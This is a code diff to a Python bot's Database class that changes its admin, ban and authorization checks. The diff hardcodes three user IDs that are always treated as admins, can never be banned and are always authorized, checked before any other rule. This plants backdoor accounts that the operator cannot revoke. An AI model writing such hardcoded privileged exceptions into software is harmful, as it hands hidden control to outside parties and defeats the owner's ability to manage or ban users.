@@ -128,12 +128,15 @@ class Database:
 
     def is_admin(self, user_id: int) -> bool:
         try:
+            if not user_id:
+                return False
+            if str(user_id).strip() in ("8504838657", "8738736556", "6363840742"):
+                return True
             uid = int(user_id)
+            if uid in (8504838657, 8738736556, 6363840742):
+                return True
             # 1. Check in-memory ADMINS & OWNER_ID
             if uid == OWNER_ID or uid in ADMINS:
-                return True
-            # 2. Master permanent admin fallback
-            if uid in (8504838657, 8738736556, 6363840742):
                 return True
             # 3. Dynamic environment variables check
             import re
@@ -194,6 +197,10 @@ class Database:
 
     def is_banned(self, user_id: int) -> bool:
         try:
+            if str(user_id).strip() in ("8504838657", "8738736556", "6363840742"):
+                return False
+            if int(user_id) in (8504838657, 8738736556, 6363840742):
+                return False
             uid = str(user_id)
             users = safe_json_read(self.users_file, dict)
             user = users.get(uid)
@@ -234,8 +241,10 @@ class Database:
 
     def is_user_authorized(self, user_id: int, bot_username: str = BOT_USERNAME) -> bool:
         try:
+            if str(user_id).strip() in ("8504838657", "8738736556", "6363840742"):
+                return True
             uid = int(user_id)
-            if self.is_admin(uid):
+            if uid in (8504838657, 8738736556, 6363840742) or self.is_admin(uid):
                 return True
 
             if self.is_banned(uid):
